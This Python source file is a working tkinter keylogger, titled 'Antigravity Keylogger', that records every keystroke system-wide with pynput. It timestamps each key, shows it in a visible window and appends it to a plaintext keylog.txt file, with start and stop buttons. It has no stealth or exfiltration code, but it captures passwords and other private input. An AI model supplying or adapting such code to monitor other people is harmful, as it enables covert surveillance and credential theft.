import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
from pynput import keyboard
import time

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Antigravity Keylogger")
        self.root.geometry("600x500")
        self.root.configure(bg="#1e1e2e")  # Dracular-ish background

        self.running = False
        self.listener = None
        self.log_file = "keylog.txt"

        self.setup_styles()
        self.create_widgets()

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure styles for a modern look
        style.configure("TFrame", background="#1e1e2e")
        style.configure("TLabel", background="#1e1e2e", foreground="#cdd6f4", font=("Segoe UI", 12))
        style.configure("Header.TLabel", font=("Segoe UI", 24, "bold"), foreground="#89b4fa")
        
        style.configure("Start.TButton", 
                        background="#a6e3a1", 
                        foreground="#1e1e2e", 
                        font=("Segoe UI", 11, "bold"),
                        padding=10)
        style.map("Start.TButton", background=[("active", "#94e2d5")])

        style.configure("Stop.TButton", 
                        background="#f38ba8", 
                        foreground="#1e1e2e", 
                        font=("Segoe UI", 11, "bold"),
                        padding=10)
        style.map("Stop.TButton", background=[("active", "#eba0ac")])

    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding="30 30 30 30")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Title
        header = ttk.Label(main_frame, text="Keylogger Controller", style="Header.TLabel")
        header.pack(pady=(0, 20))

        # Status Label
        self.status_label = ttk.Label(main_frame, text="Status: Stopped", foreground="#f38ba8")
        self.status_label.pack(pady=10)

        # Log Display Area
        self.log_display = scrolledtext.ScrolledText(
            main_frame, 
            height=12, 
            bg="#313244", 
            fg="#cdd6f4", 
            insertbackground="white",
            font=("Consolas", 10),
            borderwidth=0,
            padx=10,
            pady=10
        )
        self.log_display.pack(fill=tk.BOTH, expand=True, pady=20)
        self.log_display.config(state=tk.DISABLED)

        # Buttons Frame
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X)

        self.start_btn = ttk.Button(btn_frame, text="START LOGGING", style="Start.TButton", command=self.start_logging)
        self.start_btn.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(0, 10))

        self.stop_btn = ttk.Button(btn_frame, text="STOP LOGGING", style="Stop.TButton", command=self.stop_logging, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.RIGHT, expand=True, fill=tk.X, padx=(10, 0))

    def log_to_gui(self, text):
        self.log_display.config(state=tk.NORMAL)
        self.log_display.insert(tk.END, text + "\n")
        self.log_display.see(tk.END)
        self.log_display.config(state=tk.DISABLED)

    def on_press(self, key):
        if not self.running:
            return False
        
        try:
            k = str(key.char)
        except AttributeError:
            k = str(key)
        
        timestamp = time.strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] Pressed: {k}"
        
        # Update GUI and File
        self.root.after(0, self.log_to_gui, log_entry)
        with open(self.log_file, "a") as f:
            f.write(log_entry + "\n")

    def run_listener(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.listener = listener
            listener.join()

    def start_logging(self):
        if not self.running:
            self.running = True
            self.status_label.config(text="Status: Active", foreground="#a6e3a1")
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            
            # Start listener in a separate thread
            self.thread = threading.Thread(target=self.run_listener, daemon=True)
            self.thread.start()
            self.log_to_gui("--- Logging Started ---")

    def stop_logging(self):
        if self.running:
            self.running = False
            if self.listener:
                self.listener.stop()
            self.status_label.config(text="Status: Stopped", foreground="#f38ba8")
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.log_to_gui("--- Logging Stopped ---")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
